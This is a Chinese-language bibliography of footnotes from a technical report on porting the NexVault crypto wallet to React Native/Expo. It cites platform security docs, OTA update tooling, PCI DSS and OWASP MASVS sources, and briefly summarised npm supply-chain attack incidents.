[^130^]: Android 官方文档, Security with HTTPS and SSL（always include a backup key） — https://developer.android.com/privacy-and-security/security-ssl （2025-06-29 抓取）（首发章节：第4章）
[^131^]: React Native 源码 NetworkingModule.kt / WebSocketModule.kt（均走 OkHttpClientProvider.getOkHttpClient()） — https://github.com/facebook/react-native/tree/main/packages/react-native/ReactAndroid/src/main/java/com/facebook/react/modules （main，2026-10-14）（首发章节：第4章）
[^132^]: React Native 源码 RCTWebSocketModule.mm（#import <SocketRocket/SRWebSocket.h>，非 URLSession） — https://github.com/facebook/react-native/blob/main/packages/react-native/React/CoreModules/RCTWebSocketModule.mm （main，2026-10-14）（首发章节：第4章）
[^133^]: Chrome Platform Status, Chrome 67 deprecations（HPKP 弃用并移除） — https://developer.chrome.com/blog/chrome-67-deps-rems （2018-04-27）（首发章节：第4章）
[^134^]: MDN, Strict-Transport-Security（首次访问前不生效，preload 缩小 TOFU） — https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security （2026-10 访问）（首发章节：第4章）
[^135^]: MDN, Certificate Transparency（误签发的事后发现机制，不等于客户端 pinning） — https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency （2026-10 访问）（首发章节：第4章）
[^136^]: MDN, WebCrypto CryptoKey.extractable（非导出 key 防 export，不防 XSS 领地内调用、无硬件绑定） — https://developer.mozilla.org/en-US/docs/Web/API/CryptoKey/extractable （2026-10 访问）（首发章节：第4章）
[^137^]: Android 官方文档, Android Keystore system（hardware-backed key 与 attestation） — https://developer.android.com/privacy-and-security/keystore （2026-10 访问）（首发章节：第4章）
[^138^]: RFC 9421, HTTP Message Signatures（created/expires/nonce/keyid/tag；freshness 与 replay policy 由应用定义） — https://www.rfc-editor.org/rfc/rfc9421.html （2024-02）；另见：RFC 9421 — HTTP Message Signatures（created/expires/nonce/keyid 字段；应用须自定义 freshness/replay 策略）（首发章节：第4章）
[^139^]: EIP-155, Simple replay attack protection（chainid 编入签名哈希，v={0,1}+CHAIN_ID*2+35） — https://eips.ethereum.org/EIPS/eip-155 （Final，2016-10）（首发章节：第4章）
[^140^]: EIP-712, Typed structured data hashing and signing（明确不含 replay protection） — https://eips.ethereum.org/EIPS/eip-712 （Final）（首发章节：第4章）
[^141^]: Bugsnag Android CHANGELOG（2026-03-02 检测移后台线程；2026-10-06 移出启动路径并缓存） — https://github.com/bugsnag/bugsnag-android/blob/next/CHANGELOG.md （2026-10）（首发章节：第4章）
[^142^]: Bugsnag 源码 RootDetector.kt（固定路径 stat、build.prop 逐行解析、native 库加载） — https://github.com/bugsnag/bugsnag-android/blob/next/bugsnag-android-core/src/main/java/com/bugsnag/android/RootDetector.kt （2026-10）（首发章节：第4章）
[^143^]: Blessing et al., KeyDroid 论文 Table 6（TEE 0.01MiB 签名约 0.02s、SE 约 0.15s） — https://arxiv.org/abs/2507.07927 （2025-07-10）（首发章节：第4章）
[^144^]: Software Mansion, Reanimated 4 文档（4.x 仅支持 New Architecture；需独立安装 react-native-worklets） — https://docs.swmansion.com/react-native-reanimated/docs/fundamentals/getting-started/ （2026-10 访问）（首发章节：第4章）
[^145^]: Software Mansion, Reanimated 兼容性矩阵（版本须与 RN 版本配对） — https://docs.swmansion.com/react-native-reanimated/docs/guides/compatibility/ （2026-10 访问）（首发章节：第4章）
[^146^]: Shopify, FlashList v2 文档（免 estimatedItemSize） — https://shopify.github.io/flash-list/ （2026-10 访问）（首发章节：第4章）
[^147^]: Apple Developer, Optimizing ProMotion refresh rates（不能强制固定 120Hz；iPhone 需 CADisableMinimumFrameDurationOnPhone） — https://developer.apple.com/documentation/quartzcore/optimizing-promotion-refresh-rates-for-iphone-13-pro-and-ipad-pro （2026-10 访问）（首发章节：第4章）
[^148^]: Android 官方文档, Adaptive refresh rate（Surface.setFrameRate/WindowManager hint，不能假设恒 120Hz） — https://developer.android.com/develop/ui/views/animations/adaptive-refresh-rate （2026-10 访问）（首发章节：第4章）
[^149^]: Deploy updates / Rollouts — Expo Docs — https://docs.expo.dev/eas-update/deployment/ ; https://docs.expo.dev/eas-update/rollouts/（2026-10-14）（首发章节：第5章）
[^150^]: Rollbacks — Expo Docs — https://docs.expo.dev/eas-update/rollbacks/（2026-10-14）（首发章节：第5章）
[^151^]: gronxb/hot-updater — https://github.com/gronxb/hot-updater（2026-10-14 GitHub API 核实：1,768★，push 2026-10-14）（首发章节：第5章）
[^152^]: Best Live Update Tools for Capacitor Apps — Capgo Blog — https://capgo.app/blog/best-live-update-tools-for-capacitor-apps/（2026-08-27）（首发章节：第5章）
[^153^]: Runtime versions — Expo Docs — https://docs.expo.dev/eas-update/runtime-versions/（2026-10-14）（首发章节：第5章）
[^154^]: xprem Updates 文档 — https://xprem.dev/updates（2026-07-24）（首发章节：第5章）
[^155^]: app.json/app.config.js 配置参考 — Expo Docs — https://docs.expo.dev/versions/latest/config/app/（2026-10-14）（首发章节：第5章）
[^156^]: EAS Update OTA rejection risks — 72technologies — https://www.72technologies.com/blog/eas-update-ota-rejection-risks-2026（2026-07-03）（首发章节：第5章）
[^157^]: Usage-based pricing — Expo Docs — https://docs.expo.dev/billing/usage-based-pricing/（2026-10-14）（首发章节：第5章）
[^158^]: App Store Review Guidelines 2.5.2 — Apple Developer — https://developer.apple.com/app-store/review/guidelines/#2.5.2（2026-10-14）（首发章节：第5章）
[^159^]: Over-the-air updates — Expo Articles — https://expo.dev/articles/updates-and-rollouts/over-the-air-updates（2026-10-01）（首发章节：第5章）
[^160^]: Expo EAS Pricing Explained（错误定价来源，已裁决弃用）— rnpush — https://rnpush.com/blog/expo-eas-pricing-explained（2026-05-17）（首发章节：第5章）
[^161^]: EAS Build Introduction / Internal distribution — Expo Docs — https://docs.expo.dev/build/introduction/ ; https://docs.expo.dev/build/internal-distribution/（2026-07）（首发章节：第5章）
[^162^]: Fastlane 维护现状 — pushmyapp.ai — https://pushmyapp.ai/blog/fastlane-screenshot-alternatives-2026（2026-05-19）（首发章节：第5章）
[^163^]: expo-github-action — GitHub Marketplace — https://github.com/marketplace/actions/expo-github-action（2026 核实时有效）（首发章节：第5章）
[^164^]: Publishing websites / Web deployments CI/CD — Expo Docs — https://docs.expo.dev/guides/publishing-websites/ ; https://docs.expo.dev/tutorial/cicd/web-deployments/（2026-09）（首发章节：第5章）
[^165^]: Staged rollouts 现实 — digia.tech / newly.app — https://www.digia.tech/post/staged-rollouts-how-to-release-to-everyone-without-the-risk-of-everyone ; https://newly.app/how-to/google-play-staged-rollout（2026-06 / 2026-10）（首发章节：第5章）
[^166^]: npm Security Best Practices — lirantal（Node 安全工作组）— https://github.com/lirantal/npm-security-best-practices（2026-04-01）（首发章节：第5章）
[^167^]: JavaScript is a security liability（Qix/chalk-debug 事件复盘）— https://goilerplate.com/blog/javascript-is-a-security-liability（2026-05-17，事件 2025-09）（首发章节：第5章）
[^168^]: Mini Shai-Hulud Malware Targets Crypto Wallets via npm — Crypto Times — https://www.cryptotimes.io/2026/05/12/mini-shai-hulud-malware-targets-crypto-wallets-via-npm-packages/（2026-05-12）；另见：The Crypto Times — Mini Shai-Hulud Malware Targets Crypto Wallets via npm Packages（带有效 SLSA L3 provenance 的恶意包；流水线被劫持时下游验证静默失效）（首发章节：第5章）
[^169^]: Bybit Data Breach 案例 — Huntress Threat Library — https://www.huntress.com/threat-library/data-breach/bybit-cryptocurrency-exchange-data-breach（2025-12）；另见：Huntress Threat Library — Bybit Cryptocurrency Exchange Data Breach（Safe{Wallet} 开发者机器被社工、AWS S3 前端 JS 注入、多签签名者盲签被篡改交易，约 $1.5B）（首发章节：第5章）
[^170^]: blockEden — Shai-Hulud npm 蠕虫事件分析（700+ 包、约 $58M 加密资产损失） — https://blockeden.xyz/blog/2026/01/18/shai-hulud-%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/ （2026-01）（首发章节：第6章）
[^171^]: Cyber News Live / ELLIPAL — Trust Wallet Chrome 扩展 v2.68 供应链投毒（2500+ 钱包、$8.5M、助记词伪装为遥测数据外泄） — https://www.linkedin.com/posts/cyber-news-live_trust-wallet-chrome-extension-hacked/ （2026-01）（首发章节：第6章）
[^172^]: Shakevsky et al. — Trust Dies in Darkness: Shedding Light on Samsung's TrustZone Keymaster Design（USENIX Security 2022；TEE Keymaster 历史漏洞谱系） — https://www.usenix.org/system/files/usenixsecurity22-shakevsky.pdf （2022-08）（首发章节：第6章）
[^173^]: Quarkslab — Bypassing Android Hardware Attestation from the Analyst's Chair（attestation 中继攻击实证；hardwareEnforced 为准；服务端验证六步） — https://blog.quarkslab.com/bypassing-android-hardware-attestation.html （2026-08-11）（首发章节：第6章）
[^174^]: Android Developers — Copy and paste（Android 13+ 剪贴板预览与 EXTRA_IS_SENSITIVE 敏感标记） — https://developer.android.com/develop/ui/views/touch-and-input/copy-paste （2026-10-01）（首发章节：第6章）
[^175^]: Android Developers — Play Integrity API verdicts（三级 verdict 语义、environmentDetails、appAccessRisk） — https://developer.android.com/google/play/integrity/verdicts （2024-12 更新）（首发章节：第6章）
[^176^]: Android Developers Blog — Stronger threat detection, simpler integration（GET_INTEGRITY 修复对话框、recentDeviceActivity、deviceRecall beta） — https://android-developers.googleblog.com/2025/10/stronger-threat-detection-simpler.html （2025-11-19）（首发章节：第6章）
[^177^]: 内部文档：/mnt/agents/output/nexvault-rn-sdd/plans/3-day-implementation-plan.md — NexVault RN/Expo 三端移植 — 3 天实施计划 v1.0（排期表、关键路径、依赖图、风险矩阵、roadmap 全量）（首发章节：第7章）
[^178^]: 内部文档：/mnt/agents/output/research/nexvault-rn_cross_verification.md — nexvault-rn_cross_verification.md §一 H5/H6/H12、§三 C3、§四 全局一致性检查项（[P]/[C]/[S] 三级标注纪律；Keystore 不支持 secp256k1 的 wrap 模式；Web 不持私钥三源一致；Play Integrity STRONG 不硬卡）（首发章节：第7章）
[^179^]: 内部文档：/mnt/agents/output/research/nexvault-rn_insight.md — nexvault-rn_insight.md Insight 4（3 天工期关键路径在 native 闭环不在 UI；Day1 vault-core 最高优先级、UI 并行；卡顿超半天触发 JS noble/curves 降级占位）；另见：nexvault-rn_insight.md Insight 7 + cross_verification C3（Play Integrity 与 Key Attestation 双轨制风险分级语义：频限、证明对象、无 GMS 降级路径）（首发章节：第7章）
[^180^]: 内部文档：/mnt/agents/output/research/nexvault-rn_dim07.md — nexvault-rn_dim07.md §0/§4/§5/§7（vault-core 四方法 local module 定案；ArrayBuffer 边界；PBKDF2 fallback；BIP39/32 官方向量回归；iOS CryptoSwift + swift-secp256k1 薄封装 <300 行；D1–D3 排期依据；mlock 与剪贴板/键盘结论）（首发章节：第7章）
[^181^]: 内部文档：/mnt/agents/output/research/nexvault-rn_dim02.md — nexvault-rn_dim02.md §1/§4/§5（六项原生能力 Expo 路径与成熟度；pnpm workspace + 单 Expo app 仓库结构；pnpm 隔离安装与 hoisted 回退预案）（首发章节：第7章）
[^182^]: 内部文档：/mnt/agents/output/research/report_sec04.md — nexvault-rn_dim09.md + report_sec04.md §4.2（安全 MVP 六项裁决与逐项工作量估算：合计约 4.5–6 人日超出 3 天窗口；fail-closed 耦合为唯一 [P]；Root/Frida/反调试各子项 3 天工作量拆分）（首发章节：第7章）
[^183^]: 内部文档：/mnt/agents/output/research/nexvault-rn_repo_recon.md — nexvault-rn_repo_recon.md ①（AGENTS.md 验证纪律「Never write done without a command and its observed result」；安全红线；Handoff 递延项裁定制度）（首发章节：第7章）
[^184^]: PCI SSC, PCI DSS v4.0.1 标准正文 §14 PCI DSS Versions（"As of the published date of this document, PCI DSS v4.0.1 is the current version of the standard"；v4.0 已于 2024-12-31 退役；51 项 future-dated 要求自 2025-03-31 起强制） — https://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dss ；镜像 https://www.middlebury.edu/sites/default/files/2025-01/PCI-DSS-v4_0_1.pdf（2024-06 发布，2026-10-14 核实）（首发章节：第8章）
[^185^]: PCI SSC, PCI DSS v4.0.1 §4 Scope of PCI DSS Requirements（CDE = 存储/处理/传输 CHD/SAD 的组件、人员与流程 + 与其存在 unrestricted connectivity 的组件） — 同上官方文档库与镜像（2024-06）（首发章节：第8章）
[^186^]: PCI SSC 官方 Glossary（CHD 至少含完整 PAN；SAD = 全磁道数据 / CAV2/CVC2/CVV2/CID / PIN block，授权后禁止存储即使加密） — https://www.pcisecuritystandards.org/glossary/（2024-07 页面更新）（首发章节：第8章）
[^187^]: PCI DSS Applicability Information（"the primary account number is the defining factor for cardholder data"；姓名/有效期/服务代码仅与 PAN 共同出现时受保护；无 PAN 即无 CHD） — 同 [^184^] 官方文档库（首发章节：第8章）
[^188^]: GatewayCrypto, PCI Compliance for Payment Gateways（加密支付通道 crypto 侧完全移出 PCI 范围） — https://gatewaycrypto.io/guides/pci-compliance-for-payment-gateways/（2026-04；Medium 置信）（首发章节：第8章）
[^189^]: Marqeta 官方开发者文档：Security（PCI DSS Level 1 + SSAE-18 认证；"PANs are not stored on our servers; we only store tokens"） — https://www.marqeta.com/docs/developer-guides/security（2026-09 页面日期）（首发章节：第8章）
[^190^]: Cside, Can You Use Stripe for PCI DSS（Stripe 为 PCI DSS Level 1 服务商，QSA 年审并列于 Visa Global Registry） — https://cside.com/blog/can-you-use-stripe-for-pci-dss（2025-03）（首发章节：第8章）
[^191^]: PCI DSS Guide, Choosing the Right PCI DSS SAQ（Direct Post / 商户自托管表单捕获卡数据通常丧失 SAQ A/A-EP 资格、落入 SAQ D） — https://pcidssguide.com/choosing-the-right-pci-dss-saq/（2026-09）（首发章节：第8章）
[^192^]: MoonPay Ramps（宣称 PCI DSS 4.0.1 认证）；Paybis（宣称 PCI DSS Level 1） — https://www.moonpay.com/business/ramps ; https://paybis.com/blog/moonpay-vs-paybis-on-ramp-compared/（2026-08 / 2026-04）（首发章节：第8章）
[^193^]: PCI SSC, SAQ A v4.0.1 资格条款（全部账户数据功能外包给 PCI 合规 TPSP；支付页所有元素直接来自 TPSP——full redirect 或 provider-hosted iframe；经 SAQ 指南转述） — https://www.pcisecuritystandards.org/document_library?category=saqs ；转述 https://pciassessments.com/guides/which-saq（2026 转述）（首发章节：第8章）
[^194^]: PCI SSC FAQ 1588（2025-02-28 公告：iframe 嵌入式 SAQ A 附加脚本攻击确认资格条款；full redirect / 完全外包不适用；经 E-Commerce 4IM 转述原文） — https://ecommerce4im.com/pci-saq-a-eligibility-iframe-checkouts-script-attack-clarifications/（公告 2025-02-28，转述 2026-09；原文建议补 https://www.pcisecuritystandards.org/faq）（首发章节：第8章）
[^195^]: PCI SSC《Guidance for PCI DSS Scoping and Network Segmentation》v1.0（out-of-scope 五条判定标准：不存/不传/不处理 CHD/SAD、不在同一网段、无法连接或访问 CDE、无法经由在范围系统影响 CDE 安全控制） — https://www.pcisecuritystandards.org/documents/Guidance-PCI-DSS-Scoping-and-Segmentation_v1.pdf（2016-12）（首发章节：第8章）
[^196^]: PCI SSC《PCI DSS Scoping and Segmentation Guidance for Modern Network Architectures》（出范围组件必须分段隔离且以渗透测试验证） — 镜像 https://www.brightdefense.com/wp-content/uploads/2024/09/PCI-DSS-Scoping-and-Segmentation-Guidance-for-Modern-Network-Architectures.pdf（2024-09）（首发章节：第8章）
[^197^]: Elisity, PCI DSS 4.0 Network Segmentation Requirements（分段非强制要求，但不分段则整个连通网络全部落入范围；缩范围用分段须按 Req. 11.4.5 每年渗透测试验证、服务商 11.4.6 每半年） — https://www.elisity.com/blog/pci-dss-4-0-network-segmentation-requirements（2026-06）（首发章节：第8章）
[^198^]: Kyte Global, PCI DSS Scope Reduction: Tokenization & Segmentation（tokenization 缩数据面 + segmentation 缩 CDE 边界，为 PCI SSC 认可的两大缩范围手段） — https://kyte.global/pci-dss-scope-reduction-tokenization-segmentation/（2026-09）（首发章节：第8章）
[^199^]: Vervali, OWASP MASVS in 2026（MASVS v2.1.0 自 2024-01-18 发布仍现行，8 控制组 24 条控制；OWASP 不提供 MASVS 认证）；owasp-masvs controls 仓库实测 24 个控制文件 — https://www.vervali.com/blog/owasp-masvs-in-2026-current-version-the-8-categories-and-what-changed/ ; https://github.com/OWASP/owasp-masvs/tree/master/controls（2026-05 / 2026-10-14 实测）（首发章节：第8章）
[^200^]: OWASP MASVS 官方 index（自 v2.0.0 起 MASVS 不再含 verification levels，L1/L2/R 已 rework 为 MAS Testing Profiles） — https://github.com/OWASP/owasp-mastg/blob/master/docs/MASVS/index.md（现行）（首发章节：第8章）
[^201^]: OWASP MAS 官方《MAS Testing Profiles》（攻击者模型：L1=设备上其他应用、L2=OS 不可信+可能有物理接触、R=设备用户本人是对手；示例矩阵：money transfers/Banking → MAS L2+P+R；"crypto key encrypting user data" 列为中高风险敏感数据示例） — https://mas.owasp.org/MASTG/0x03b-Testing-Profiles/（现行，2026 修订版）（首发章节：第8章）
[^202^]: OWASP MAS Profile 官方页：MAS-L2（"recommended for apps that handle high-risk sensitive data and contain sensitive functionality"，假设设备已 root/越狱）与 MAS-R（"meant to augment and not replace MAS-L1 and MAS-L2…cannot assure a 100% effectiveness"） — https://mas.owasp.org/Profiles/MAS-L2/ ; https://mas.owasp.org/Profiles/MAS-R/（现行）（首发章节：第8章）
[^203^]: 内部文档：/mnt/agents/output/research/nexvault-rn_dim13_compliance.md — nexvault-rn_dim13_compliance.md 主题 1/主题 2（PCI-DSS 适用范围论证链与官方引文；SAQ A/FAQ 1588/issuer-processor 隔离方案；MASVS v2.1.0 术语修正与 L1/L2/R 定义；八控制组逐组自评素材含 AUTH 生物特征变更密钥失效缺口；周边框架清单）（首发章节：第8章）

配套工程文件：AGENTS.md、specs/（6 模块）、plans/3-day-implementation-plan.md、doc/dependencies.md。
